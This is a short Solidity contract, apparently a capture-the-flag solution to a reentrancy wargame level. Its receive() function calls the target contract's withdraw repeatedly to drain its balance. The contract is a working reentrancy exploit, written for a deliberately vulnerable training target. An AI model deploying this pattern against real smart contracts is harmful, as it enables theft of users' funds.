// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './Reentrance.sol';

contract ReentranceSolved {
  
  Reentrance public reentrance;

  constructor (address payable _reentrance) public{
    reentrance = Reentrance(_reentrance);
  }

  function withdraw(uint _amount) public {
    reentrance.withdraw(_amount);
  }

  receive() external payable {
    // calling withdraw function of reentrance here will send Reentrance into a loop
    reentrance.withdraw(msg.value);
  }
}